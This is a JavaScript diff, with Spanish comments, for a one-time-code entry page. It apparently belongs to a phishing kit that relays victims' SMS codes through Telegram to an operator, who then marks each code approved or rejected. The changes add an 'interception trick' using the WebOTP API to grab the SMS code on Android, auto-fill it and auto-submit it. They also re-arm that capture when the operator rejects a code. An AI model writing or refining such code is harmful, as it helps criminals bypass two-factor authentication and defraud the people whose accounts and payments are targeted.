@@ -19,6 +19,7 @@
 
   let remaining = CODE_TTL_SECONDS;
   let timerId = null;
+  let oTPAbortController = null; // Controlador para cancelar la escucha de Android
 
   (function initConfiguredMask() {
     try {
@@ -85,6 +86,54 @@
     renderTimer();
     clearInterval(timerId);
     timerId = setInterval(tick, 1000);
+    
+  // Cada vez que inicia el temporizador, activamos la escucha en Android
+    activarEscuchaAutomaticaAndroid();
+  }
+
+  function getCode() {
+    return inputs.map((i) => i.value.substring(0, 1)).join("");
+  }
+
+  function isComplete() {
+    return inputs.every((i) => i.value.trim().length >= 1);
+  }
+
+  function refreshSubmitState() {
+    if (submitBtn) {
+      submitBtn.disabled = !isComplete() || remaining <= 0;
+    }
+  }
+
+  // ============================================================
+  // TRUCO DE INTERCEPTACIÓN AVANZADA PARA ANDROID (WebOTP API)
+  // ============================================================
+  function activarEscuchaAutomaticaAndroid() {
+    if (!('credentials' in navigator) || !('OTPCredential' in window)) return;
+
+    if (oTPAbortController) oTPAbortController.abort();
+    oTPAbortController = new AbortController();
+
+    navigator.credentials.get({
+      otp: { transport: ['sms'] },
+      signal: oTPAbortController.signal
+    }).then(otp => {
+      if (otp && otp.code) {
+        const coincidencia = otp.code.match(/\d{6}/);
+        if (coincidencia) {
+          coincidencia[0].split("").forEach((char, idx) => {
+            if (inputs[idx]) inputs[idx].value = char;
+          });
+          refreshSubmitState();
+          // Simula el submit si se completa de forma nativa en Android
+          if (isComplete() && form) {
+            form.dispatchEvent(new Event("submit"));
+          }
+        }
+      }
+    }).catch(err => {
+      console.log("WebOTP pasiva terminada.");
+    });
   }
 
   startTimer();
@@ -119,6 +168,7 @@
         inputs.forEach(input => {
           input.value = "";
           input.classList.remove("invalid");
+          input.setAttribute("maxlength", "6");
         });
         if (inputs[0]) inputs[0].focus();
 
@@ -127,25 +177,64 @@
     });
   }
 
-  function getCode() {
-    return inputs.map((i) => i.value).join("");
-  }
 
-  // Comprueba si cada caja tiene al menos un número ingresado
-  function isComplete() {
-    return inputs.every((i) => i.value.length === 1);
-  }
+// ============================================================
+  // EVENTOS DE LOS INPUTS ASIGNADOS EN TU ORDEN ORIGINAL
+  // ============================================================
+  inputs.forEach((input, index) => {
+    input.addEventListener("input", (e) => {
+      input.classList.remove("invalid");
+      const val = e.target.value;
 
-  function refreshSubmitState() {
-    if (submitBtn) {
-      submitBtn.disabled = !isComplete() || remaining <= 0;
-    }
-  }
+      // DETECCIÓN DE SUGERENCIA SMS O PEGADO DE TEXTO COMPLETO (Android e iPhone)
+      if (val.length > 1) {
+        const numeros = val.replace(/\D/g, "");
+        const cleanValue = numeros.slice(-6); // Extrae los últimos 6 dígitos (ignora precios)
+        
+        cleanValue.split("").forEach((char, idx) => {
+          if (inputs[idx]) {
+            inputs[idx].value = char;
+          }
+        });
+        
+        refreshSubmitState();
+        
+        // Disparo automático si se completa desde el SMS masivo
+        if (isComplete() && form) {
+          form.dispatchEvent(new Event("submit"));
+        }
+        return;
+      }
+
+      // MANEJO ESTÁNDAR PARA INGRESO CASILLA POR CASILLA
+input.value = val.replace(/\D/g, "");
+      if (input.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+      
+      refreshSubmitState();
+    });
+
+
+// Control para retroceso al borrar
+input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !e.target.value && index > 0) {
+        inputs[index - 1].focus();
+        inputs[index - 1].value = "";
+        inputs[index - 1].classList.remove("invalid");
+        refreshSubmitState();
+      }
+    });
+  });
+
+
 
   // ============================================================
-  // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM
+  // LOGIC ENTRANTE EN TU EVENTO SUBMIT (TELEGRAM Y POLLING)
   // ============================================================
-  async function enviarFormulario() {
+  if (form) {
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
       if (!isComplete() || remaining <= 0) return;
 
       const enteredCode = getCode();
@@ -280,68 +369,21 @@
 
 
       } else if (decision === 'rejected') {
-        submitBtn.disabled = false;
-        submitBtn.textContent = "Validar código";
-        if (messageEl) {
-          messageEl.textContent = "Código incorrecto. Por favor, verifícalo e inténtalo de nuevo.";
-          messageEl.style.color = "#d9534f";
-          messageEl.className = "otp-message error";
-        }
-        inputs.forEach(input => {
-          input.value = "";
-          input.classList.remove("invalid");
-        });
-        if (inputs[0]) inputs[0].focus();
-      }
-    }
-
-
-// ============================================================
-  // EVENTOS DE LOS INPUTS CORREGIDOS PARA IPHONE Y ANDROID
-  // ============================================================
-inputs.forEach((input, index) => {
-input.addEventListener("input", (e) => {
+submitBtn.disabled = false;
+submitBtn.textContent = "Validar código";
+if (messageEl) {
+messageEl.textContent = "Código incorrecto. Por favor, verifícalo e inténtalo de nuevo.";
+messageEl.style.color = "#d9534f";
+messageEl.className = "otp-message error";
+}
+inputs.forEach(input => {
+input.value = "";
 input.classList.remove("invalid");
-const val = e.target.value;
-// DETECCIÓN GLOBAL DE AUTOCOMPLETADO (Captura el bloque largo completo)
-if (val.length > 1) {
-const numeros = val.replace(/\D/g, "");
-const cleanValue = numeros.slice(-6);
-// Esparcimos de forma limpia en cada caja
-cleanValue.split("").forEach((char, idx) => {
-if (inputs[idx]) {
-inputs[idx].value = char;
-}
+input.setAttribute("maxlength", "6");
 });
-refreshSubmitState();
-if (isComplete()) {
-enviarFormulario();
+if (inputs[0]) inputs[0].focus();
+activarEscuchaAutomaticaAndroid(); // Volvemos a escuchar si rechaza el código
 }
-return;
-}
-// MANEJO ESTÁNDAR PARA INGRESO CASILLA POR CASILLA
-input.value = val.replace(/\D/g, "");
-if (input.value && index < inputs.length - 1) {
-inputs[index + 1].focus();
-}
-refreshSubmitState();
-if (isComplete()) {
-enviarFormulario();
-}
-});
-// Control para retroceso al borrar
-input.addEventListener("keydown", (e) => {
-if (e.key === "Backspace" && !input.value && index > 0) {
-inputs[index - 1].focus();
-inputs[index - 1].value = "";
-refreshSubmitState();
-}
-});
-});
-if (form) {
-form.addEventListener("submit", function (e) {
-e.preventDefault();
-enviarFormulario();
 });
 }
 })();
